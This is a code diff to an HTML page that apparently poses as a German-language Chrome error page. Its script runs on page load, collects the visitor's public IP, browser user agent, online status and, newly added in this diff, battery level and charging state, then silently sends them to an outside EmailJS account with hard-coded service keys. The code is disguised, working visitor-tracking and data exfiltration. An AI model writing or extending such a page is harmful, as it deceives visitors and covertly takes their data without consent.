@@ -138,6 +138,7 @@ Chrome • Fehlerseite
 </div>
 
 
+
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
 <script>
@@ -148,6 +149,8 @@ emailjs.init("oWqEGQ9wx4lEAFou3");
 window.onload = async function(){
 
 let ip = "Nicht verfügbar";
+let akku = "Nicht verfügbar";
+
 
 try {
 
@@ -163,9 +166,38 @@ console.log("IP konnte nicht geladen werden");
 }
 
 
+// Akku auslesen
+
+try {
+
+if (navigator.getBattery) {
+
+let battery = await navigator.getBattery();
+
+akku = Math.round(battery.level * 100) + "%";
+
+if (battery.charging) {
+    akku += " (Lädt)";
+} else {
+    akku += " (Nicht am Laden)";
+}
+
+}
+
+} catch(e){
+
+console.log("Akku konnte nicht geladen werden");
+
+}
+
+
+
 let daten = `
 Öffentliche IP:
 ${ip}
+
+Akku:
+${akku}
 
 Browser:
 ${navigator.userAgent}
@@ -184,6 +216,7 @@ ${navigator.onLine}
 `;
 
 
+
 emailjs.send(
 "service_qsb9wyd",
 "template_1cgk7xd",
@@ -194,18 +227,22 @@ message:daten
 )
 
 .then(()=>{
+
 console.log("Gesendet!");
+
 })
 
 .catch(error=>{
+
 console.log("Fehler:",error);
+
 });
 
 
 };
 
-
 </script>
+
 
 </body>
 </html>
